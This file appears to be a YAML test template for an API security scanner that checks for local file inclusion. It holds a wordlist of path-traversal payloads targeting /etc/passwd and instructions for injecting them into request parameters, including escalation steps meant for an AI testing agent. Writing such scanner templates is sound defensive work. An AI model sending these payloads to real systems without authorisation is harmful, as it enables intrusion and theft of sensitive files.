id: SMART_LFI_IN_PARAMETER
info:
  name: "LFI in Parameter - Smart Testing"
  description: "Test Local File Inclusion by replacing path-like body or query parameters with path-traversal and sensitive-file payloads. Keep baseline method, URL, and auth headers intact; mutate only in-scope parameter values."
  details: "Clone the baseline. Across 4-5+ probes escalate path traversal into string parameters that look path-related or accept file names: basic ../ sequences toward /etc/passwd, URL-encoded and double-encoded variants, null-byte suffixes, and alternate OS path styles when useful. Vary target fields. Proof vs baseline: THIS response contains file contents absent from baseline (e.g. root:x:0:0:, passwd/shadow markers, config snippets, docker/k8s paths). Generic 200 with unchanged business body, or merely echoing the traversal string, is NOT vulnerable. Prefer deeper traversal / encoding after a miss."
  impact: "Unauthorized file access, sensitive data disclosure, credential theft, and potential system compromise."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: SMART_LFI_IN_PARAMETER
  severity: HIGH
  agenticTestingAllowed: true
  onlySmartTestingAllowed: true
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
    - https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt
  cwe:
    - CWE-98
    - CWE-22
  cve:
    - CVE-2022-29597
    - CVE-2021-39433
    - CVE-2023-22973

attributes:
  nature: INTRUSIVE
  plan: STANDARD
  duration: FAST

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    neq: "OPTIONS"
  or:
    - request_payload:
        for_one:
          key:
            regex: .*
            extract: file_path
          value:
            extract: file_value
    - query_param:
        for_one:
          key:
            regex: .*
            extract: file_path
          value:
            extract: file_value

wordLists:
  lfiPayloads:
    - "../../../../../../etc/passwd"
    - "..%2f..%2f..%2f..%2fetc/passwd"
    - "../../../../../../etc/passwd%00"
    - "/etc/passwd"

execute:
  type: single
  requests:
    - req:
        - modify_body_param:
            file_path: ${lfiPayloads}
        - modify_query_param:
            file_path: ${lfiPayloads}
